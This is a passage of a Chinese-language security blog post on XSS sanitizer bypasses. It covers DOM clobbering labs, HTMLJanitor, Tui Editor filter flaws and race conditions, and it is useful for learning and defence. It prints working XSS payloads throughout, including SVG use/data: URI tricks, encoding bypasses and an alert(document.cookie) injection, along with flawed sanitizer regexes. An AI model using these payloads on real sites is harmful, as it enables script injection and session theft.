class=\"line\">root.innerHTML = data;</span><br><span class=\"line\"><span class=\"title function_ invoke__\">setTimeout</span>( () =&gt; &#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (let el of root.<span class=\"title function_ invoke__\">querySelectorAll</span>(<span class=\"string\">&#x27;*&#x27;</span>)) &#123;</span><br><span class=\"line\">     let attrs = [];</span><br><span class=\"line\">     <span class=\"keyword\">for</span> (let attr of el.attributes) &#123;</span><br><span class=\"line\">      attrs.<span class=\"title function_ invoke__\">push</span>(attr.name);</span><br><span class=\"line\">     &#125;</span><br><span class=\"line\">     <span class=\"keyword\">for</span> (let name of attrs) &#123;</span><br><span class=\"line\">      el.<span class=\"title function_ invoke__\">removeAttribute</span>(name);</span><br><span class=\"line\">     &#125;</span><br><span class=\"line\">    &#125;    </span><br><span class=\"line\">    document.body.<span class=\"title function_ invoke__\">appendChild</span>(root)</span><br><span class=\"line\">&#125; , <span class=\"number\">2000</span>)</span><br></pre></td></tr></table></figure>\n<p>这样保证了 alert 一定会在 js 删除之前执行，执行点在 innerHTML</p>\n<p>如果没有弹出，可能在 js 删除之后才执行</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">const data = decodeURIComponent(location.hash.substr(1));;</span><br><span class=\"line\">const root = document.createElement(&#x27;div&#x27;);</span><br><span class=\"line\">root.innerHTML = data;</span><br><span class=\"line\"></span><br><span class=\"line\">let details = root.querySelector(&quot;details&quot;)</span><br><span class=\"line\">root.removeChild(details)</span><br><span class=\"line\"></span><br><span class=\"line\">for (let el of root.querySelectorAll(&#x27;*&#x27;)) &#123;</span><br><span class=\"line\"> let attrs = [];</span><br><span class=\"line\"> for (let attr of el.attributes) &#123;</span><br><span class=\"line\">  attrs.push(attr.name);</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"> for (let name of attrs) &#123;</span><br><span class=\"line\">  el.removeAttribute(name);</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>details 异步执行是将执行函数放入一个事件队列中，只要事件不停止，在放入事件队列中，删除 details 已经没用，事件队列仍会执行</p>\n<p>details 有延迟的话肯定执行成功，因为此时异步事件已经执行完成，执行点在 innerhtml 如果没有延迟，有可能在 js 删除属性之后，异步事件才执行完成</p>\n<h2 id=\"dom-clobbering-burp-suite\"><a class=\"markdownIt-Anchor\" href=\"#dom-clobbering-burp-suite\">#</a> Dom Clobbering - Burp Suite</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cueXVxdWUuY29tL2F0dGFjaG1lbnRzL3l1cXVlLzAvMjAyMi9tZC8yNzU5Mjg1LzE2NDM4MDkwNjM2NzktYzAxY2IzM2EtYWQ2MS00ZTg0LTg2MTgtZGU1M2E4MjI4YjU4Lm1k\">📎Exploiting DOM clobbering to enable XSS.md</span></p>\n<h3 id=\"lab-exploiting-dom-clobbering-to-enable-xss\"><a class=\"markdownIt-Anchor\" href=\"#lab-exploiting-dom-clobbering-to-enable-xss\">#</a> Lab: Exploiting DOM clobbering to enable XSS</h3>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function displayComments(comments) &#123;</span><br><span class=\"line\">    let userComments = document.getElementById(&quot;user-comments&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">    for (let i = 0; i &lt; comments.length; ++i)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        comment = comments[i];</span><br><span class=\"line\">        let commentSection = document.createElement(&quot;section&quot;);</span><br><span class=\"line\">        commentSection.setAttribute(&quot;class&quot;, &quot;comment&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">        let firstPElement = document.createElement(&quot;p&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">        let defaultAvatar = window.defaultAvatar || &#123;avatar: &#x27;/resources/images/avatarDefault.svg&#x27;&#125;</span><br><span class=\"line\">        let avatarImgHTML = &#x27;<span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;avatar&quot;</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;&#x27; + (comment.avatar ? escapeHTML(comment.avatar) : defaultAvatar.avatar) + &#x27;&quot;</span>&gt;</span>&#x27;;</span><br><span class=\"line\"></span><br><span class=\"line\">        let divImgContainer = document.createElement(&quot;div&quot;);</span><br><span class=\"line\">        divImgContainer.innerHTML = avatarImgHTML</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">id</span>=<span class=\"string\">test1</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">id</span>=<span class=\"string\">test1</span> <span class=\"attr\">name</span>=<span class=\"string\">test2</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br><span class=\"line\">返回HTMLCollection(2) [a#test1, a#test1, test1: a#test1, test2: a#test1]</span><br><span class=\"line\">通过test1取到collections中，test2取到第二个a</span><br><span class=\"line\">--&gt; window.test1.test2</span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;test1&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;test2&quot;</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br><span class=\"line\">--&gt; node.attributes.length </span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;a id=defaultAvatar&gt;&lt;a id=defaultAvatar name=avatar href=&quot;cid:&amp;quot;onerror=alert(2)&quot;//&gt;</span><br><span class=\"line\">&lt;a id=defaultAvatar href=&quot;&quot;&gt;</span><br><span class=\"line\">&lt;a id=defaultAvatar name=avatar href=&quot;1:&amp;quot;onerror=alert(1)//&quot;&gt;</span><br></pre></td></tr></table></figure>\n<p>这里很明显我们可以用 Dom Clobbering 来控制  <code>window.defaultAvatar</code> ，只要我们原来没有头像就可以用一个构造一个 <code>defaultAvatar.avatar</code>  进行 XSS 了。</p>\n<p>触发后</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;img class=&quot;avatar&quot; src=&quot;cid:&quot; onerror=&quot;alert(1)&quot;//&quot;&quot;&gt;</span><br></pre></td></tr></table></figure>\n<p>href 中的内容需要符合 dompurify 中的协议</p>\n<p>至于为什么要用 a 标签，在 ok boomer 中有详细解释，因为 a 标签不继承 tostring 方法</p>\n<p>在 <code>&lt;a&gt;</code>  元素的情况下， <code>toString</code>  只返回一个 <code>href</code>  属性值。最终把 href 中的内容放入 img 的 src 中</p>\n<h3 id=\"labclobbering-dom-attributes-to-bypass-html-filters\"><a class=\"markdownIt-Anchor\" href=\"#labclobbering-dom-attributes-to-bypass-html-filters\">#</a> Lab:Clobbering DOM attributes to bypass HTML filters</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HTMLJanitor.prototype.clean = function (html) &#123;</span><br><span class=\"line\">const sandbox = document.implementation.createHTMLDocument(&#x27;&#x27;);</span><br><span class=\"line\">const root = sandbox.createElement(&quot;div&quot;);</span><br><span class=\"line\">root.innerHTML = html;</span><br><span class=\"line\"></span><br><span class=\"line\">this._sanitize(sandbox, root);</span><br><span class=\"line\"></span><br><span class=\"line\">return root.innerHTML;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"title class_\">HTMLJanitor</span>.<span class=\"property\"><span class=\"keyword\">prototype</span></span>.<span class=\"property\">_sanitize</span> = <span class=\"keyword\">function</span> (<span class=\"params\"><span class=\"variable language_\">document</span>, parentNode</span>) &#123;                                                                           </span><br><span class=\"line\"><span class=\"keyword\">var</span> treeWalker = <span class=\"title function_\">createTreeWalker</span>(<span class=\"variable language_\">document</span>, parentNode);</span><br><span class=\"line\"><span class=\"keyword\">var</span> node = treeWalker.<span class=\"title function_\">firstChild</span>();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (!node) &#123; <span class=\"keyword\">return</span>; &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">do</span> &#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (node.<span class=\"property\">nodeType</span> === <span class=\"title class_\">Node</span>.<span class=\"property\">TEXT_NODE</span>) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// If this text node is just whitespace and the previous or next element</span></span><br><span class=\"line\">    <span class=\"comment\">// sibling is a block element, remove it</span></span><br><span class=\"line\">    <span class=\"comment\">// N.B.: This heuristic could change. Very specific to a bug with</span></span><br><span class=\"line\">    <span class=\"comment\">// `contenteditable` in Firefox: http://jsbin.com/EyuKase/1/edit?js,output</span></span><br><span class=\"line\">    <span class=\"comment\">// <span class=\"doctag\">FIXME:</span> make this an option?</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (node.<span class=\"property\">data</span>.<span class=\"title function_\">trim</span>() === <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">        &amp;&amp; ((node.<span class=\"property\">previousElementSibling</span> &amp;&amp; <span class=\"title function_\">isBlockElement</span>(node.<span class=\"property\">previousElementSibling</span>))</span><br><span class=\"line\">             || (node.<span class=\"property\">nextElementSibling</span> &amp;&amp; <span class=\"title function_\">isBlockElement</span>(node.<span class=\"property\">nextElementSibling</span>)))) &#123;</span><br><span class=\"line\">      parentNode.<span class=\"title function_\">removeChild</span>(node);</span><br><span class=\"line\">      <span class=\"variable language_\">this</span>.<span class=\"title function_\">_sanitize</span>(<span class=\"variable language_\">document</span>, parentNode);</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">      <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// Remove all comments</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (node.<span class=\"property\">nodeType</span> === <span class=\"title class_\">Node</span>.<span class=\"property\">COMMENT_NODE</span>) &#123;</span><br><span class=\"line\">    parentNode.<span class=\"title function_\">removeChild</span>(node);</span><br><span class=\"line\">    <span class=\"variable language_\">this</span>.<span class=\"title function_\">_sanitize</span>(<span class=\"variable language_\">document</span>, parentNode);</span><br><span class=\"line\">    <span class=\"keyword\">break</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">var</span> isInline = <span class=\"title function_\">isInlineElement</span>(node);</span><br><span class=\"line\">  <span class=\"keyword\">var</span> containsBlockElement;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (isInline) &#123;</span><br><span class=\"line\">    containsBlockElement = <span class=\"title class_\">Array</span>.<span class=\"property\"><span class=\"keyword\">prototype</span></span>.<span class=\"property\">some</span>.<span class=\"title function_\">call</span>(node.<span class=\"property\">childNodes</span>, isBlockElement);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// Block elements should not be nested (e.g. &lt;li&gt;&lt;p&gt;...); if</span></span><br><span class=\"line\">  <span class=\"comment\">// they are, we want to unwrap the inner block element.</span></span><br><span class=\"line\">  <span class=\"keyword\">var</span> isNotTopContainer = !! parentNode.<span class=\"property\">parentNode</span>;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> isNestedBlockElement =</span><br><span class=\"line\">        <span class=\"title function_\">isBlockElement</span>(parentNode) &amp;&amp;</span><br><span class=\"line\">        <span class=\"title function_\">isBlockElement</span>(node) &amp;&amp;</span><br><span class=\"line\">        isNotTopContainer;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">var</span> nodeName = node.<span class=\"property\">nodeName</span>.<span class=\"title function_\">toLowerCase</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">var</span> allowedAttrs = <span class=\"title function_\">getAllowedAttrs</span>(<span class=\"variable language_\">this</span>.<span class=\"property\">config</span>, nodeName, node);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">var</span> isInvalid = isInline &amp;&amp; containsBlockElement;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// Drop tag entirely according to the whitelist *and* if the markup</span></span><br><span class=\"line\">  <span class=\"comment\">// is invalid.</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (isInvalid || <span class=\"title function_\">shouldRejectNode</span>(node, allowedAttrs)</span><br><span class=\"line\">      || (!<span class=\"variable language_\">this</span>.<span class=\"property\">config</span>.<span class=\"property\">keepNestedBlockElements</span> &amp;&amp; isNestedBlockElement)) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// Do not keep the inner text of SCRIPT/STYLE elements.</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (! (node.<span class=\"property\">nodeName</span> === <span class=\"string\">&#x27;SCRIPT&#x27;</span> || node.<span class=\"property\">nodeName</span> === <span class=\"string\">&#x27;STYLE&#x27;</span>)) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">while</span> (node.<span class=\"property\">childNodes</span>.<span class=\"property\">length</span> &gt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        parentNode.<span class=\"title function_\">insertBefore</span>(node.<span class=\"property\">childNodes</span>[<span class=\"number\">0</span>], node);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    parentNode.<span class=\"title function_\">removeChild</span>(node);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable language_\">this</span>.<span class=\"title function_\">_sanitize</span>(<span class=\"variable language_\">document</span>, parentNode);</span><br><span class=\"line\">    <span class=\"keyword\">break</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// Sanitize attributes</span></span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> a = <span class=\"number\">0</span>; a &lt; node.<span class=\"property\">attributes</span>.<span class=\"property\">length</span>; a += <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> attr = node.<span class=\"property\">attributes</span>[a];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"title function_\">shouldRejectAttr</span>(attr, allowedAttrs, node)) &#123;</span><br><span class=\"line\">      node.<span class=\"title function_\">removeAttribute</span>(attr.<span class=\"property\">name</span>);</span><br><span class=\"line\">      <span class=\"comment\">// Shift the array to continue looping.</span></span><br><span class=\"line\">      a = a - <span class=\"number\">1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// Sanitize children</span></span><br><span class=\"line\">  <span class=\"variable language_\">this</span>.<span class=\"title function_\">_sanitize</span>(<span class=\"variable language_\">document</span>, node);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125; <span class=\"keyword\">while</span> ((node = treeWalker.<span class=\"title function_\">nextSibling</span>()));</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;form id=x tabindex=0 onfocus=alert(document.cookie)&gt;&lt;input id=attributes&gt;</span><br></pre></td></tr></table></figure>\n<h2 id=\"tui_editor\"><a class=\"markdownIt-Anchor\" href=\"#tui_editor\">#</a> Tui_editor</h2>\n<p>常见的 Markdown 渲染器对于 XSS 问题有两种处理方式：</p>\n<ul>\n<li>在渲染的时候格外注意，在写入标签和属性的时候进行实体编码</li>\n<li>渲染时不做任何处理，渲染完成以后再将整个数据作为富文本进行过滤</li>\n</ul>\n<p>相比起来，后一种方式更加安全（它的安全主要取决于富文本过滤器的安全性）。前一种方式的优势是，不会因为二次过滤导致丢失一些正常的属性，另外少了一遍处理效率肯定会更高，它的缺点是一不注意就可能出问题，另外也不支持直接在 Markdown 里插入 HTML。</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cueXVxdWUuY29tL2F0dGFjaG1lbnRzL3l1cXVlLzAvMjAyMi9tZC8yNzU5Mjg1LzE2NDM4MTQwMDM2NTItZWUzMDYwMjItZTMxMS00N2Y5LWJkYjYtYzAzOWYwN2NmMTNmLm1k\">📎Tui Editor 的 bypass 之路.md</span></p>\n<blockquote>\n<p>过滤过程是：</p>\n<ol>\n<li>先正则直接去除注释与 onload 属性的内容</li>\n<li>将上面处理后的内容，赋值给一个新创建的 div 的 innerHTML 属性，建立起一颗 DOM 树</li>\n<li>用黑名单删除掉一些危险 DOM 节点，比如 iframe、script 等</li>\n<li>用白名单对属性进行一遍处理，处理逻辑是\n<ul>\n<li>只保留白名单里名字<strong>开头</strong>的属性</li>\n<li>对于满足正则 <code>/href|src|background/i</code>  的属性，进行额外处理</li>\n</ul>\n</li>\n<li>处理完成后的 DOM，获取其 HTML 代码返回</li>\n</ol>\n</blockquote>\n<p>绕过 1：</p>\n<p>使用 SVG 的 use 标签，use 的作用是引用本页面或第三方页面的另一个 svg 元素，比如：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;svg&gt;</span><br><span class=\"line\">    &lt;circle id=&quot;myCircle&quot; cx=&quot;5&quot; cy=&quot;5&quot; r=&quot;4&quot; stroke=&quot;blue&quot;/&gt;</span><br><span class=\"line\">    &lt;use href=&quot;#myCircle&quot;&gt;&lt;/use&gt;</span><br><span class=\"line\">&lt;/svg&gt;</span><br></pre></td></tr></table></figure>\n<p>use 的 href 属性指向那个被它引用的元素。但与 a 标签的 href 属性不同的是，use href 不能使用 JavaScript 伪协议，但可以使用 data: 协议。</p>\n<p>比如：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;svg&gt;&lt;use href=&quot;data:image/svg+xml,&lt;svg id=&#x27;x&#x27; xmlns=&#x27;http://www.w3.org/2000/svg&#x27; xmlns:xlink=&#x27;http://www.w3.org/1999/xlink&#x27; width=&#x27;100&#x27; height=&#x27;100&#x27;&gt;&lt;a xlink:href=&#x27;javascript:alert(1)&#x27;&gt;&lt;rect x=&#x27;0&#x27; y=&#x27;0&#x27; width=&#x27;100&#x27; height=&#x27;100&#x27; /&gt;&lt;/a&gt;&lt;/svg&gt;#x&quot;&gt;&lt;/use&gt;&lt;/svg&gt;</span><br></pre></td></tr></table></figure>\n<p>data 协议中的文件必须是一个完整的 svg，而且整个 data URL 的末尾，需要有一个锚点 <code>#x</code>  来指向内部这个被引用的 svg。</p>\n<p>对于 XSS sanitizer 来说，这个 Payload 只有 svg、use 两个标签和 href 一个属性，但因为 use 的引用特性，所以 data 协议内部的 svg 也会被渲染出来。</p>\n<p>data 协议，base64 编码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;svg&gt;&lt;use href=&quot;data:image/svg+xml;base64,PHN2ZyBpZD0neCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyAKICAgIHhtbG5zOnhsaW5rPSdodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rJyB3aWR0aD0nMTAwJyBoZWlnaHQ9JzEwMCc+PGEgeGxpbms6aHJlZj0namF2YXNjcmlwdDphbGVydCgxKSc+PHJlY3QgeD0nMCcgeT0nMCcgd2lkdGg9JzEwMCcgaGVpZ2h0PScxMDAnIC8+PC9hPjwvc3ZnPg#x&quot;&gt;&lt;/use&gt;&lt;/svg&gt;</span><br></pre></td></tr></table></figure>\n<p>绕过 2：</p>\n<p>ISO-2022-JP 编码</p>\n<p>ISO-2022-JP 编码在解析的时候会忽略 <code>\\x1B\\x28\\x42</code> ，也就是 <code>%1B%28B</code> 。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;svg&gt;&lt;use href=&quot;data:image/svg+xml;charset=ISO-2022-JP,&lt;svg id=&#x27;x&#x27; xmlns=&#x27;http://www.w3.org/2000/svg&#x27; xmlns:xlink=&#x27;http://www.w3.org/1999/xlink&#x27; width=&#x27;100&#x27; height=&#x27;100&#x27;&gt;&lt;a xlink:href=&#x27;javas%1B%28Bcript:alert(1)&#x27;&gt;&lt;rect x=&#x27;0&#x27; y=&#x27;0&#x27; width=&#x27;100&#x27; height=&#x27;100&#x27; /&gt;&lt;/a&gt;&lt;/svg&gt;#x&quot;&gt;&lt;/use&gt;&lt;/svg&gt;</span><br></pre></td></tr></table></figure>\n<p>即三种方式</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">base64</span><br><span class=\"line\">Chrome ISO-<span class=\"number\">2022</span>-JP</span><br><span class=\"line\">&lt;details ontoggle=<span class=\"string\">&quot;alert(1)&quot;</span>&gt; </span><br></pre></td></tr></table></figure>\n<p>或</p>\n<p>通过条件竞争</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;svg&gt;&lt;svg onload=alert(1)&gt;</span><br><span class=\"line\">&lt;details open ontoggle=alert(1)&gt;</span><br></pre></td></tr></table></figure>\n<p>补丁绕过</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">export const TAG_NAME = &#x27;[A-Za-z][A-Za-z0-9-]*&#x27;;</span><br><span class=\"line\">const reXSSOnload = new RegExp(`(&lt;$&#123;TAG_NAME&#125;[^&gt;]*)(onload\\s*=)`, &#x27;ig&#x27;);</span><br><span class=\"line\"></span><br><span class=\"line\">export function sanitizeHTML(html: string) &#123;</span><br><span class=\"line\">    const root = document.createElement(&#x27;div&#x27;);</span><br><span class=\"line\"></span><br><span class=\"line\">    if (isString(html)) &#123;</span><br><span class=\"line\">        html = html.replace(reComment, &#x27;&#x27;).replace(reXSSOnload, &#x27;$1&#x27;);</span><br><span class=\"line\">        root.innerHTML = html;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // ...</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>1. 贪婪模式导致绕过</p>\n<p>正则在标签名 <code>[A-Za-z][A-Za-z0-9-]*</code>  的后面，使用了 <code>[^&gt;]*</code>  来匹配非 <code>&gt;</code>  的所有字符。</p>\n<p>如果此时有两个 <code>onload=</code> ，那么这个 <code>[^&gt;]*</code>  将会匹配到第二个，而将它删除掉，而第一个 <code>onload=</code>  将被保留。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;svg&gt;&lt;svg onload=alert(1) onload=alert(2)&gt;&lt;/svg&gt;&lt;/svg&gt;</span><br></pre></td></tr></table></figure>\n<p>2. 非贪婪绕过</p>\n<p>即使改成非贪婪模式，删除掉的是第一个 <code>onload=</code> ，第二个 <code>onload=</code>  仍然会保留，所以无法解决问题，构造的 Payload 如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;p&gt;&lt;svg&gt;&lt;svg onload=onload=alert(1)&gt;&lt;/svg&gt;&lt;/svg&gt;&lt;/p&gt;</span><br></pre></td></tr></table></figure>\n<p>正则优化：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(&lt;[A-Za-z][A-Za-z0-9-]*\\s)([onload=]*))</span><br></pre></td></tr></table></figure>\n<p>3. 字符匹配导致问题</p>\n<p>如果这个正则匹配上 HTML 属性中的一个 <code>&gt;</code> ，则会停止向后匹配，这样 <code>onload=</code>  也能保留下来。Payload 如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;svg&gt;&lt;svg x=&quot;&gt;&quot; 